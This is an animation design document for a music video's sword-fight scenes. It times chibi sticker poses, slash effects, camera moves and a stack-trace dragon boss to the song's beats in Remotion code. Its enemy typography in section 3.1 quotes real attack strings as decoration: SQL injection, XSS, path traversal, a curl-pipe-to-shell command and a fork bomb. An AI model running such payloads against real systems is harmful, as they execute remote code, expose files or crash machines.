# 千行剑: fight design for chibi stickers in Remotion code

This covers the opening slash, Drop 1, Drop 2, the chorus slash beats, the payoff on 赛, and every chibi drawing those need. Times are in song seconds, and frames are `round(t × 30)` at 30 fps. Bar *b* starts at 0.465 + 1.5·*b*. At 160 BPM a beat is 0.375 s (11.25 frames), an 8th note is 0.1875 s (5.6 frames) and a 16th is 0.094 s (2.8 frames).

## 0. The design in brief

The fights are limited animation built from strong pose cards. Each drawing appears on its drum hit, and code draws everything between the drawings: smears, slash arcs, hit-stop, impact frames, ink and the camera. The enemies are red text: real attack payloads and error messages, drawn in code. Each hit cuts the text, the pieces turn to black ink, and the city's red goes down.

One signature move, **回车三连 (the Enter combo)**, sits on a 3-3-2 stab figure the band plays at the end of the intro and of both drops. She makes three cuts that hang in the air, then plants the sword like pressing Enter, and all three cuts go off at once. The move appears four times and gets bigger each time. The fourth one kills the boss.

The boss, 红字劫, is a Chinese dragon whose body is a runaway stack trace. One generated monochrome ink painting gives its head; code turns the painting into text and builds the rest.

Key numbers:
- **20 fight drawings on 3 sheets** (6 + 8 + 6). `tsundere` goes on the non-fight sheet and the sword alone goes on the chibi reference sheet, for 22 images in all. 13 of them are essential.
- **No enemy art.** The boss takes one generation (4 ink cells).
- **Pose changes average about 2 per second, with peaks of 5.3 per second** (8th notes, at most one bar). They never go faster. Code adds the smear and impact frames in between, so the combo bars show 8–11 distinct key images per second.

---

## 1. What the music gives the fights (measured)

I ran an onset grid over the mp3: spectral flux in four bands (808, snare, mid, hats) sampled on the 16th-note grid of `song/timeline.json`. There were no stems, so re-check these on a fresh stem split before building. The scripts (grid.py, stab.py) stayed in the cloud session scratchpad. Below, "16th 3" means the fourth 16th of the bar (counted from 0).

- **The stab figure (3+3+2).** Bars 7, 47, 55 and 102 end their phrases with four unison band hits on 16ths 0 · 3 · 6 · 8:
  - Bar 7: 10.965 / 11.246 / 11.528 / 11.715
  - Bar 47: 70.965 / 71.246 / 71.528 / 71.715
  - Bar 55: 82.965 / 83.246 / 83.528 / 83.715, plus a snare at 84.09
  - Bar 102: 153.465 (soft) / 153.746 / 154.028 / 154.215, plus 154.59 and 154.78

  This rhythm carries the Enter combo.
- **Opening:**
  - There is silence until 0.27. The first sound is the pickup at 0.28 (about −22 dB). The loud hit is the bar-0 downbeat at 0.465 (about −12 dB).
  - Suona accents land at 4.03 (bar 2, 16th 6) and 6.28 (the pickup into bar 4).
  - The drum kit enters on bar 4 at 6.465 (kick on 1 and 3, snare on 2 and 4). Bar 6 has a fill (10.31–10.87), bar 7 has the stab figure, and the vocal pickup is at 12.04.
- **Drop 1:**
  - The groove is kick on 1 and 3, snare on 2 and 4.
  - Fills: the end of bar 43 (65.62–66.37); all of bar 46 (69.47–70.78, with a kick at 70.78); the end of bar 51 (77.72–78.28); bar 54 (81.47, 81.65, 82.03, 82.40, then a roll 82.50–82.87).
  - Four-bar phrases: 40–43 | 44–47 | 48–51 | 52–55.
- **Drop 2:**
  - Bar 87 kicks on 1 and 2 (130.97, 131.34) with a snare at 132.09. Bar 90 has a fill on beats 3–4 (136.22–136.87). Bar 93 is broken up (140.15, 140.53, 140.72–140.90, 141.28).
  - **Bar 94 has no 808 at all** (141.47–142.97). A suona and pipa run plays at 141.47, 141.75, 142.12, 142.22 and 142.59. This is the only breath in either drop.
  - Bar 95 starts soft, with no kick until 143.81. Bar 98 has a fill (148.22–148.87), and all of bar 101 is a fill (151.97–153.37).
  - Phrases: 87–90 | 91–94 | 95–98 | 99–102.
- **The slams:** 劈 at 53.34 and 122.34, and 赛 at 183.84, all land on beat 2 of the chorus's last bar.

---

## 2. Fight grammar

### 2.1 Staging rules
1. **The threat lives on screen-right.** The tide comes from the right, and the dragon's head is placed on the right whenever she faces it. So nearly every side pose faces screen-right and only has to be drawn once. She crosses that line only when surrounded (Drop 1 bars 48–49) and on the zigzag climb (Drop 2 bar 92).
2. **The sword is in the near hand.**
   - Facing right, she holds it in the pearl-white cybernetic right arm (the near arm).
   - Facing left, she holds it in her **left** hand, the one in the wide sleeve. That puts the blade and the sleeve's flare toward the camera.
   - Front and back views use the right hand. The overhead moves and the Enter use both hands.
   - The sword only changes hands across a smear frame, never during a hold.
3. **The camera is at eye level, at her chest height** (STYLE_BIBLE rule 11). When she jumps, the camera rises with her. The drama comes from scale: she is 120–220 px tall against a wave or a dragon that fills the frame.
4. **Two light colours.** The enemy lights her from its side in cinnabar, and her blade lights her from the other side in cyan (offset coloured drop-shadows on the sticker). Ink black means death and aftermath. Paper white is kept for impact frames.
5. **Mirroring.** Never mirror her, and never mirror text. The sword on its own may be mirrored (that is just the view of its other face). So may the dragon, which has no handed markings; its text is drawn after the flip so it still reads.

### 2.2 The anatomy of a move (30 fps)

| Phase | What happens | Frames |
|---|---|---|
| Anticipation | The wind-up drawing, pushed 10–20 px away from the strike and squashed 6–10 % | At least 6 (an 8th) for a cut, at least 11 (a beat) for the issen and big moves. Inside a combo, the previous finish is the wind-up |
| Smear | Code only: the slash arc, a cyan swept silhouette, 2–4 cyan multiples, speed lines | 1–2 |
| Impact | The finish drawing appears **on the hit frame** (the drum hit rounded to the frame), already at its new position | 1 |
| Hit-stop | Everything except the music freezes: enemies, particles, rain and camera drift. A spark appears where the blade touches | 0 on 8th-note hits, 2–3 on beat hits, 5–8 on finishers and downbeats |
| Follow-through and hold | The finish drawing drifts on 8–20 px in the strike direction (ease-out) and breathes (±1.2 % scale). The arc's tail erodes and the camera keeps moving | Until the next swap |
| Recovery | A hop back to `low`: an arc plus a 12 % landing squash (tokentoken's `Pet` hop) | 4–8 |

Rules:
- **Every swap moves her.** A swap in place reads as flicker, so each new drawing appears 20–300 px further along the strike.
- **Hit-stop is a time remap, not a pause.** One fight clock, `clock(t) = t − Σ min(max(t − hit, 0), stop)`, drives everything except the music. Anything a hit sets off starts after its stop, so the next beat still lands on the beat.
- **Only rigid moves on her drawings:** translate, rotate, scale and squash (at most 12 %). A standing drawing turns by ±10° at most, while airborne drawings can rotate freely. There is no mesh warp and no puppet deformation. The storm habit of warping between key drawings is not adopted; here the in-between is a smear.
- **Impact frames are 1–2 frames long.** They use three tones (ink, paper, cinnabar), with her silhouette inverted and radial brush lines. There are only 12 in the film: 0.465, 11.715, 53.32, 60.465, 71.715, 83.715, 122.33, 130.965, 141.465, 149.34, 154.215 and 183.85. No two are within 0.34 s of each other (PLAYBOOK: at most 3 large flashes per second).
- **Camera presets:**
  - Punch S / M / L: scale +3 / +5 / +8 % over 2 frames, easing back over 6 / 8 / 10.
  - Shake S / L: 6 px, or 16 px with a 1.5° roll, noise-driven, decaying over 8 / 14 frames.
  - Whip: a 4-frame pan with a directional brush blur, landing on the hit frame.
  - Track: follows her runs, with 3 parallax layers.
  - Push: 1.5 % per second on every hold, so the camera never stops (owner rule).
  - Roll: ±6–8° on spins and reveals.
  - Crash zoom: 0.3 s from wide to her face on a downbeat.

### 2.3 How many drawings, and how fast
- **A move needs two drawings, a wind-up and a finish.** Combos chain each finish into the next wind-up: `cut_down` ends low and `cut_up` starts low, and `leap` holds the blade high, which flows into `cut_down`. So the vocabulary is:
  - 1 stance (`low`)
  - 4 finishes (`cut_down`, `cut_up`, `issen`, `chop`)
  - 3 travel drawings (`dash`, `leap`, `landing`)
  - 4 set poses (`charge`, `enter`, `sword_finger`, `spin`)
  - 3 reactions (`guard`, `blasted`, `back`)
  - 1 close-up, 2 left-facing drawings, 1 thrust, and the spoken-line poses
- **The swap ceiling is the 8th note.** At 160 BPM an 8th is 5.6 frames, the same spacing as anime keys drawn on threes to sixes. Swapping drawings on 8ths with a 1–2-frame code smear between them looks like limited animation on threes. That is the ceiling: faster swaps of whole chibi stickers (big face, white border) read as flicker.
- **Rates.** Drop 1 averages about 2 swaps per second (47 swaps in 24 s), and Drop 2 about 1.5 per second (36 swaps). The boss's own motion carries more of Drop 2. The peaks are 5.3 per second in bars 53 and 92.
- **The storm figure, as data.** Storm's 7–11 drawing changes per second is met as a *perceived* rate in the combo bars once the code keys are counted. Each swap brings a smear frame, and many bring an impact frame or a cut, so the screen gets 8–11 distinct key images per second while only 4–5 of them are drawings.
- **Holds are where the PV beauty lives:** the pose after the cut, with the world moving around it. Every hold carries motion: the finish drift, the arc decaying, enemies splitting, ink falling, the camera pushing, the rain.

### 2.4 What code draws (everything except her and the dragon's head)

| Effect | How |
|---|---|
| Slash arc (剑光) | A calligraphy-brush crescent along the drawing's measured blade arc. It has a white core 4–6 px wide, a cyan body tapering to points, and dry-brush (飞白) breaks on the outer edge. It grows over 2 frames from the hilt side, holds for 2, then erodes from its start over 6–10 frames, with ink flecks peeling off |
| Smear | Her silhouette (the sticker's alpha) swept along the path in flat cyan at 70 % for 1–2 frames, plus a stretched copy of the finish drawing (×1.3 along the motion, ×0.9 across) at the midpoint |
| Multiples and afterimages | 2–4 cyan-tinted copies along the path at opacity 0.45 down to 0.15, gone within 4–6 frames |
| Motion blur | Only on camera whips and fast enemies, as a directional brush blur. Never on her held drawing |
| Speed lines | Ink-brush strokes, tapered with broken edges. Parallel bands on dashes, radial lines on punches and dives |
| Sparks | At the measured blade point, only on frames where the blade and the target actually touch: a 4-point star and 6–12 streaks, cooling from cyan to white and gone in 6 frames |
| Ink | Bursts, droplets, stains, splats on the lens and ink-wipe transitions |
| Shockwaves | Flat ellipse rings in perspective, for landings, the Enter ripple and the roar |
| Light | Rim lights on her, the blade's light falling on nearby glyphs, and the ⏎ crossguard flaring on each Enter |
| Squash and stretch, hops, breathing, tilts | Rigid transforms of the drawing (tokentoken's `Sticker`/`Pet`) |
| Faces | Blush lines, 💢 and sweat drops on the spoken beats (STYLE_BIBLE §8) |
| HUD | Monocle reticles and connecting lines, with no numbers |
| Enemies | The whole tide, plus the dragon's body, eyes, whiskers, roar, regrowth and unwinding |
| Sword formation | Instanced sword sprites, the same ones the choruses use |
| Rain | The world's rain. It bends in shockwaves and **hangs still during hit-stops**, which is the clearest sign of a hit-stop |

Code never draws her. There is no SVG or pixel chibi, and no warping of her drawings.

### 2.5 State without simulation
Remotion renders frames independently and out of order, so all fight state must be a pure function of song time. Each section gets one choreography table:
- **swaps:** time, drawing, feet x/y, height
- **hits:** time, contact point, kind, hit-stop length, impact-frame flag
- **enemy events:** spawns and deaths

Particles are closed-form (start position + velocity·age + ½·gravity·age²), seeded by a hash. Stains and the red mask are redrawn each frame from the list of deaths before *t*.

Each drawing gets measured data once, like tokentoken's `stickers.json` box: the feet point, the shoulder pivot, the blade line (hilt and tip), the crossguard point and the monocle point. Finish poses also get their arc (start angle, end angle, radius). Code then draws the arc where her blade actually went and places sparks only where the blade touches something.

---

## 3. The enemies

### 3.1 The hacker tide is typography, drawn in code
The tide is built from the hackers' payloads and the errors they cause, set in JetBrains Mono in cinnabar:

- **Payloads (the hackers):**
  - `' OR 1=1 --`
  - `<script>alert(1)</script>`
  - `../../etc/passwd`
  - `$(curl -s x.sh | sh)`
  - `:(){ :|:& };:`
  - floods of `GET /admin HTTP/1.1`
- **Errors (the damage):**
  - `TypeError: Cannot read properties of undefined`
  - `Segmentation fault (core dumped)`
  - `panic: runtime error: index out of range`
  - `java.lang.NullPointerException`
  - `502 Bad Gateway`
  - `ECONNREFUSED`
  - `Traceback (most recent call last):`

| Form | What it looks like | Used in |
|---|---|---|
| 潮 Wave | A breaking wave whose body is rows of text flowing along it. The crest's foam is loose glyphs. Three depth layers | The opening horizon; Drop 1 bars 36–47 |
| 箭 Dart | One payload string thrown like a blade: a bright head glyph and a smeared tail, about 250 px long | Bar 41 |
| 虫 Bug | One short error line crawling on a wiggling path, with tiny code-drawn leg strokes alternating under the glyphs. It keeps crawling for 4 frames after it is cut | Opening rooftops; bars 42–45 |
| 涡 Vortex | A cylinder of text lines spinning around her. Its near side passes in front of the lens | Bars 48–51 |
| 源 Source | A churning red cloud on the horizon, with thousands of `GET /` lines streaming out of it | Bars 52–55 |
| Banner | A giant hanging signboard: one of the city's blank boards, filled with red text in code | Opening bar 7 |

**Why code, for quality:**
- Text is razor-sharp at any zoom and under bloom.
- A cut can run *through* letters exactly, and each glyph can burst on its own.
- Flocking, waves and crawling are procedural and cost no drawings.
- The palette and font stay identical from shot to shot, with no drift between GPT batches.

**Why code, for theme:**
- 红字劫 means "the calamity of red text". The enemy has to be readable red text, and programmers in the audience will recognise every string.
- GPT images may contain no text (a hard rule), so generated enemies would lose exactly what makes them enemies.
- The tide is never a drawn character, so the owner's verdict that code-drawn characters look ugly does not apply.

**How it is rendered:** one three.js layer of instanced glyph quads from a JetBrains Mono atlas (tokentoken's chip-atlas technique), which handles tens of thousands of glyphs at 30 fps. A cut is a half-plane per instance: every glyph a cut line crosses is drawn twice, once clipped to each side, and the halves then move apart.

### 3.2 Death: red turns to ink
When text is cut:
1. The halves slide 30–60 px apart along the cut over 4 frames.
2. They flash white for 1 frame.
3. They turn ink-black and burst. Each glyph throws 3–8 procedural ink blots that fall with gravity, land as stains on the surface below, and fade over 2–4 s. The biggest bursts also throw a few out-of-focus blots across the lens.

There is no blood and no red droplets: the red always dies as black.

### 3.3 The red curve (the only story curve)
**How the red is drawn:**
- The city plates are painted neutral, with blank signboards.
- Code fills the boards with red error text (denser as the red level R rises) or with cyan text, and grades the sky and rain red in proportion to R.
- Locally, each slash leaves a clean cut where the red grade is removed, and each death leaves an ink stain.

**The values the fights set:**
- 0.465: the reveal, R = 1.0
- Drop 1: bar 40, 0.78 → bar 43, 0.74 → bar 47, 0.68 → bar 51, 0.62 → bar 55, 0.55
- Hook 2: the city's remaining red flows into the beast, so the city drops 0.35 → 0.15 while the beast holds the rest
- Drop 2: bar 94 (the low point) swells back to 0.30 → bar 96, 0.25 → bar 102, 0.10, then the bridge goes monochrome
- Final chorus: starts at about 0.30 after the reboot and reaches 0 on 赛 at 183.85

---

## 4. The moves (named)

1. **一闪 Issen (dash-through cut).**
   - She holds `low` for at least a beat (8 % squash, pulled back 16 px).
   - On frame H−1 she vanishes. A straight streak runs from her start to her end point (white core 4 px, cyan body 18 px, glow 60 px, tapered), with 16 parallel brush lines around it.
   - On frame H, `issen` appears at the far end, with 3 cyan multiples along the path fading over 4 frames.
   - Every enemy the path crossed gets a 1–2 px white hairline cut and freezes (hit-stop 3).
   - The split comes on the next beat, or on the Enter. She holds `issen` with a small smirk while the enemies behind her fall apart.
2. **回车三连 The Enter combo (the 3+3+2 stab bar).**
   - On 16ths 0 · 3 · 6 · 8 she goes `cut_down` → `cut_up` → `issen` → `enter`.
   - The three cuts break nothing yet. Each leaves a glowing cut line on the target, with sparks crawling along it.
   - On 16th 8 she plants the sword. The ⏎ crossguard flares, and a keypress ripple (a flat ring on the ground) runs out from the point. The whole frame dips 6 px and springs back like a key pressed down. Every hanging cut goes off at once: impact frame, hit-stop 6, ink.
   - For the rest of the bar she holds `enter` under falling ink while the camera pushes in.
   - It plays four times, growing each time: a banner (11.715), the wave tube (71.715), the whole horizon plus sealing the breach (83.715), and the dragon (154.215).
3. **分潮 Tide split.**
   - `low` at 60.18, then `cut_up` on the drop downbeat at 60.465.
   - The arc is drawn 20× her height, straight up the face of the wave, and the wave is cut along a vertical line.
   - The two halves slide down and outward on either side of her, rotating away by ±8° and shedding ink on the snares (60.84, 61.59). She stands in the gap.
4. **踏浪 Wave run (轻功).** She runs (`dash`) along the crest while the wave's text scrolls under her feet. Each footstep on the 8ths drops a cyan ring onto the text. Foam spikes rising ahead are cut on the snares by `cut_down` swaps.
5. **剑气 Sword-qi.** From a `cut_down` finish, the arc breaks off and flies forward as a crescent (about 900 px per beat, turning slightly). It cuts everything it crosses with hairlines, then frays into sparks. The enemies it cut split on the next kick.
6. **残影三闪 Triple issen.** `low`, then three `issen`s on three consecutive 8ths at three different places. The two earlier copies stay as cyan afterimages and fade over 6 frames; this is the only time two of her are on screen, and the tint marks them as an effect. Three streaks cross, and the targets split on the next snare.
7. **回旋斩 Whirlwind.**
   - `low` → `spin`.
   - A full ring slash (a flat ellipse around her waist) draws itself in 4 frames, then expands to 3× its size over a beat, cutting the vortex's inner wall in a circle. The bursts ripple around the ring on the 16ths.
   - The camera rolls 8° and back. While she holds the pose, it rocks ±3° and pulses horizontally (scaleX 0.94↔1) on the 16ths.
8. **万剑 Sword rain and chains.**
   - She holds `sword_finger`. The formation's swords rise in groups on the 8ths, and their tips turn toward the targets one frame apart.
   - Volleys fire on the beats. Each sword is a streak and stays in its target, quivering for 3 frames. The pinned glyphs turn ink-black: patched.
   - In Drop 2 the volleys stitch through the coils into the tower in lines.
9. **锁定 Lock-on.**
   - The `face` close-up appears in a diagonal panel with dry-brush ink borders and paper gutters.
   - The monocle HUD throws reticle brackets onto targets on the 8ths, with thin lines back to the monocle, and no numbers.
   - The next issen runs through every locked target.
10. **正面对刺 Head-on clash.**
    - Reverse shots: first the dragon's frontal head charging the lens (her view), then `thrust` straight at the lens (its view).
    - Where the tip meets the jaws, a cyan crack runs across the frame from the tip, with sparks (hit-stop 6, impact frame).
    - Then a wide side shot: the head recoils.

---

## 5. The opening slash (0–12.465, bars 0–7)

| Time | Music | 千行 | Picture | Camera |
|---|---|---|---|---|
| 0.000–0.267 | Silence | `low`, mid-left, about 420 px tall. **This is the first frame** | The black is *your screen*, faintly textured with dark code lines at 4 %. A cyan glint runs down the blade edge, and the monocle glints at frame 6 | Push from 1.00 to 1.04 |
| 0.28 | The pickup (first sound) | Gone (smear frame) | One streak from lower-left to upper-right, the cover's diagonal, with brush speed lines | — |
| 0.30–0.46 | — | `issen` at the upper-right end, her back to the cut | Hit-stop: the cut line burns across the whole black and sparks crawl along it | Micro-shake |
| **0.465** | Bar 0, the loud hit | `issen` | The black splits along the cut. The two halves slide apart and tip away in depth, their edges burning cyan and shedding ink flakes. Behind them is the red city in rain (R = 1.0). Impact frame | Punch L, shake L |
| 0.47–4.0 | Hook, bars 0–2 | `leap`, used as a fall (rotated −20° → 0) | She drops into the city past dripping eaves and red signboards | Descends with her |
| 4.03 | Accent | `landing` | Lands on a ridge with an ink ring and a dust puff | Punch S |
| 4.97–6.28 | Bar 3 | `back` | She overlooks the red city. The tide glows on the horizon (foreshadowing Drop 1) | Behind her at chest height, slow push |
| 6.278 | Pickup | `low` | — | — |
| 6.465 | Bar 4, the kit enters | `cut_up` | Title carve: the rising arc is the mask that reveals 「千行剑」 in cyan brush calligraphy across the red sky | Punch M |
| 6.84–10.30 | Bars 4–6 | `dash` on the kicks, `cut_down` on each snare (6.84, 7.59, 8.34, 9.09, 9.84), hopping roof to roof | A rooftop run to the right. Each snare swap splits one red bug on a ridge into ink | Track, 3 layers |
| 10.31–10.87 | Fill | `leap` | She leaps toward a giant hanging banner of red error text | Tilt up with her |
| 10.965 / 11.246 / 11.528 / 11.715 | Stabs | `cut_down` / `cut_up` / `issen` / `enter` | **Enter combo #1** on the banner. She plants the sword on the roof below and the banner falls apart into ink that becomes the verse's rain | Punch on each hit; impact frame at 11.715 |
| 11.715–12.465 | — | `enter` held | Ink rain falls, leaving a dark stain where the red sign hung | Crane down to the street for 霓虹淋雨 (12.04) |

Opening on a slash at 0.28 replaces the build-up intro that PROGRESS flagged against the "open on the strongest moment" rule. No glitch blocks or RGB split are used.

---

## 6. Drop 1: the hacker tide (bars 40–55, 60.465–84.465)

Setting: the city's firewall, a Chinese city wall whose bricks are cyan code. The 破墙来犯 breach from Verse 1 is the gap she holds, 一夫当关. The breach is on screen-right and the city is behind her on the left.

The four phrases:
- **A, 分潮 (Splitting the tide):** she holds the gap.
- **B, 踏浪 (Running the waves):** she runs on the tide itself.
- **C, 围城 (Surrounded):** the tide encircles her.
- **D, 逆流 (Against the current):** she pushes out to the source and seals the breach.

**Lead-in (Hook 1, bars 36–39):**
- 54.465–57.47: the chorus's split world parts onto the real city. The tide rises beyond the wall on each hook downbeat, its bricks cracking red.
- 57.47: `back`, small in the breach, against the cresting wave.
- 59.10 「哼」: cut to `smug`, medium shot with a slow push (not a freeze). The wave is reflected red in her monocle, and the reticle flicks on the stabs.
- 「就这点报错？」 appears in a ZCOOL KuaiLe speech bubble.
- 60.18 (错): she swaps to `low` as the sword comes off her shoulder, with an 8 % squash. From 60.28 the wave's shadow falls over her.

| Bar · start | Music | 千行 (drawing @ time) | Enemies and FX | Camera |
|---|---|---|---|---|
| **40** · 60.465 | DROP; kick, snares at 60.84 and 61.59 | `cut_up` 60.465, held the whole bar with an upward drift | **Tide split.** The halves fall either side of her, with ink sprays on the snares | Wide from inside the breach, punch L, slow push. Impact frame, hit-stop 6 |
| **41** · 61.965 | Kicks 61.97, 62.34, 62.72; snare 63.09 | `cut_down` 61.965 · `cut_up` 62.34 · `cut_down` 62.715 · `cut_up` 63.09 | Payload darts from the right at four heights. Each meets the blade on the beat (spark at the blade point, hit-stop 2), snaps and goes to ink | Medium side shot, shake S on each hit |
| **42** · 63.465 | Groove | `face` 63.465 (cut-in) · `low` 64.215 · `issen` 64.59 | **Lock-on:** reticles land on 6 bugs on the 8ths, then one streak runs through all six | Panels slam in on a whip, then a medium side shot; whip along the streak |
| **43** · 64.965 | Kicks; fill 65.62–66.37 | `issen` held · `dash` 65.34 · `leap` 65.715 | The six split and burst in a 16th-note ripple (64.97–65.43); the wall's bricks behind them turn cyan. She climbs the face of the next wave on the fill | Tilt up, vertical speed lines |
| **44** · 66.465 | Kick 1/3, snare 2/4 | `dash` 66.465 (landing squash) · `cut_down` 66.84 · `dash` 67.215 · `cut_down` 67.59 | **Wave run** on the crest. Foam spikes are cut on the snares, and her footsteps leave rings | Track, parallax |
| **45** · 67.965 | Kick pickup 69.28 | `cut_up` 67.965 · `dash` 68.34 · `cut_down` 68.715 · `dash` 69.09 | A bug leaps at her. On 68.715 a **sword-qi** crescent flies ahead along the crest; the row it cut splits on 69.28 | Cut to the target's view at 68.715 as the crescent rushes the lens |
| **46** · 69.465 | Fill all bar | `dash` · `cut_up` 69.84 · `cut_down` 70.215 · `dash` 70.59 · `leap` 70.778 | The wave curls into a tube and she runs inside it. Debris glyphs pelt her on the fill hits; the mouth closes; she leaps out on the kick | Inside-the-tube tracking (a glyph tunnel in three.js) |
| **47** · 70.965 | **Stabs** | `cut_down` 70.965 · `cut_up` 71.246 · `issen` 71.528 · `enter` 71.715 | **Enter combo #2.** She plants on the battlement; the whole wave collapses into ink, and the wall re-lights cyan outward from her sword point | Wide, punch on each hit. Impact frame 71.715, then a slow push in the ink rain |
| **48** · 72.465 | Groove | `back` 72.465 · `cut_down` 72.84 · `cut_down_l` 73.215 · `cut_down` 73.59 | The remaining red twists into a **vortex** around her on the wall top. Tendrils lash from right, left, right, and she cuts on alternating sides | Medium shot; the vortex's near side passes in front of the lens; slow roll |
| **49** · 73.965 | Snare 74.34 | `low` 73.965 · `spin` 74.34 · `low` 75.09 | **Whirlwind:** the ring cuts the vortex's inner wall, with bursts all around | Punch M; roll +8° and back |
| **50** · 75.465 | Groove | `sword_finger` 75.465 | The formation rises around her in a ring on the 8ths, the tips turn outward (76.215), and volley 1 fires on 76.59 | Slow push; the formation turns, the camera does not |
| **51** · 76.965 | Fill 77.72–78.28 | `sword_finger` held | Volleys on 76.965 and 77.34, then rapid fire on every 16th of the fill. The vortex is pinned and shredded into ink | Alternate wide and close cuts; a small punch on each 8th of the fill |
| **52** · 78.465 | Groove | `dash` 78.465 · `cut_down` 78.84 · `dash` 79.215 · `cut_up` 79.59 | Out through the breach. `GET /` streams rush at her head-on and she cuts through them | Track; speed-line background |
| **53** · 79.965 | Snare 81.09 | `low` 79.965 · `issen` 80.34 / 80.528 / 80.715 | **Triple issen** across three streams; they split and burst on 81.09 | Wide, then punch on 81.09 |
| **54** · 81.465 | Fill: 81.47, 81.65, 82.03, 82.40, roll 82.50–82.87 | `leap` 81.465, rotated nose-down for the dive from 82.40 | She rises toward the source cloud. At the apex (82.03) she is a silhouette with a cyan rim against the red moon. On the roll she dives with stretch, afterimages and radial lines | Follows her up, then a crash zoom down with the dive |
| **55** · 82.965 | **Stabs**; snare 84.09 | `cut_down` 82.965 · `cut_up` 83.246 · `issen` 83.528 · `enter` 83.715 | **Enter combo #3** at the source. The ripple runs across the horizon and the whole tide goes off. It travels back to the wall, where the breach seals as cyan bricks type themselves in. The last ink plume lands on 84.09 | Impact frame 83.715; pull back wide |

Hand-off (optional): as 「有人笑我 旧剑已钝」 begins at 84.06, one surviving line pops up on her blade, `DeprecationWarning: '旧剑' is deprecated`, which leads into Verse 2's faded look.

---

## 7. Drop 2: 红字劫, the Overflow Dragon (bars 87–102, 130.965–154.965)

### 7.1 What it is
All the red left in the city gathers into one beast: a recursion that never returns. Its body *is* the stack trace and reads from head to tail:

```
RangeError: Maximum call stack size exceeded     ← the head; its roar
    at recurse (jianghu.js:42:7)                 ← each body segment, repeated
    at main (jianghu.js:1:1)                     ← the tail tip
```

- **It grows.** It gets longer each phrase, the way a stack grows with each call.
- **Cut limbs regrow.** They retype themselves line by line, because the recursion keeps calling.
- **Pinned frames stay dead.** Frames pinned by her swords are patched, turn black and stop regrowing.
- **The head is the weak point.** It is the top of the stack. Pressing Enter on it returns the recursion, and the stack unwinds frame by frame **from the head to the tail**, which is the correct order. The fight's logic follows from this, and every effect has a cause, which the owner asked for on tokentoken's game scene.

### 7.2 How it is built: one ink painting plus code
- **Head and claw: one generation** (the boss sheet, §10.4). It is a monochrome Chinese ink painting on flat white with four cells: head in profile with jaws closed, head in profile roaring, head-on roaring, and one foreclaw.
  - A build-time tool, like tokentoken's `make_ascii.py`, samples each cell into a grid of monospace cells (about 150 columns for the head).
  - The cells are filled with **the stack-trace text in reading order**, so a close-up reads as real text. Each glyph's brightness and weight follow the ink density: dark ink gives a bright, bold cinnabar glyph, a pale wash gives a small dim one, and paper is left empty.
  - The painting is kept as a silhouette mask. As a fallback, if the glyph field looks muddy from a distance, the painting goes under the glyphs at 40 % multiply.
- **Body: code.**
  - A spline ribbon 120–160 of her heights long and 1–2 heights thick, coiled around the central pagoda tower. Its back half passes behind the tower plate and its front half in front.
  - The stack frames run along it as rows of text, with a spine ridge of short glyph columns. The belly is brighter, and the edges dissolve into ink smoke.
- **Eyes:** two white-hot points with a red bloom. They flare 2 frames before every attack, which is its tell. **Whiskers:** two long text lines on wavy paths.
- **Why the hybrid:**
  - A dragon head drawn in code would read as vector clip-art, which the owner has rejected for characters.
  - A fully painted beast could not coil, be cut, regrow, or be made of real text.
  - The painting gives the shape and the brushwork; code makes it text and makes it move.
- Its moves are the roar (a cone of glyphs plus shockwave rings on the kicks), claw swipe, tail sweep, bite, coil squeeze, head-on charge and regrowth.

### 7.3 Lead-in (Hook 2 + Spoken 2, bars 82–86)
- **123.47–128.30:** after Chorus 2 the city is mostly cyan. The leftover red peels off signs and walls and flows through the streets toward the central tower, spiralling up it out of focus behind her.
- **128.30–130.59:** `tsundere`, with the sword sprite planted beside her. 「才、才不是为了你才修的！」 appears in a bubble, with blush lines, a 💢 that pops on the stab at 128.92 and a sweat drop. The camera pushes slowly.
- Behind her, the dragon's head rises over the tower and its eyes light on 的 (130.38): the oblivious-character gag.
- **130.59:** she feels it and turns to `back`. In a 2-frame streak the sword moves from the ground into her hand, so there is only ever one sword.

### 7.4 Bar by bar

| Bar · start | Music | 千行 | Dragon and FX | Camera |
|---|---|---|---|---|
| **87** · 130.965 | DROP; kicks 130.97 and 131.34; snare 132.09 | `guard` 130.965, skidding 260 px; stops on 132.09 with a squash and an ink dust puff | **The roar:** the roaring-profile head fills the right two-thirds of the frame and the message blasts out as a cone of glyphs, with shock rings on both kicks. Her guard parts the stream like a rock in water | Impact frame; shake L twice |
| **88** · 132.465 | Kicks 132.47, 132.84, 133.22 | `back`, small, lower-left on a roof | **Reveal:** the whole dragon coiled around the tower, the stack text streaming along it. The coils tighten on each kick and the tower's cyan windows flicker red. At 133.59 the head swings round to face her (closed profile) | Slow crane up the tower |
| **89** · 133.965 | Kicks; 135.09 | `low` 133.965 · `cut_up` 134.34 · `low` 135.09 | Claw swipe from the right (eye tell first). Her rising cut takes off the talons (hit-stop 3); they burst into ink on 134.72 | Side medium; punch M |
| **90** · 135.465 | Fill 136.22–136.87 | `face` 135.84 (cut-in) · `leap` 136.31 | **Regrowth:** the stump retypes its talons line by line on the 8ths, and her HUD sees it. The tail sweeps in from screen-left on the fill; she leaps and it passes under her in a streak | Panel slam, then a whip with the tail |
| **91** · 136.965 | 8th riff 137.34–137.90 | `dash` 136.965 | She runs up the coiled body. The text scrolls under her feet, and each step on the 8ths stamps a cyan patch ring into the red | Track, rising |
| **92** · 138.465 | Beats | `dash` 138.465 · `cut_down` 138.653 · `dash_l` 138.84 · `cut_down_l` 139.028 · `dash` 139.215 · `cut_down` 139.403 · `dash_l` 139.59 · `cut_down_l` 139.778 | **Zigzag** up the coils around the tower: a leap on each beat and a cut on each landing. The cyan scars retype behind her. This is Drop 2's density peak (5.3 swaps per second) | Rises with her, alternating left and right framings on the beats |
| **93** · 139.965 | 140.15, 140.53, 140.72–140.90, 141.28 | `leap` 140.153 | The jaws open (eyes flare at 139.90) and snap at her. She leaps up, and the jaws clamp shut on the empty spot on 140.528 (shock ring, sparks off the glyph teeth) | Punch M on the snap; tilt up |
| **94** · 141.465 | **BREAK, no 808**; suona run | `blasted` 141.465, slowly rotating −10° → −35° as she falls | The head rears and roars point-blank, and her guard breaks. **Slow motion:** rain hangs in the air, the roar's glyphs drift past like snow, and the colours drain to ink and red. The city's red swells back to 0.30. **The low point** | Impact frame. Drifts with her fall at her height; no shake (stillness) |
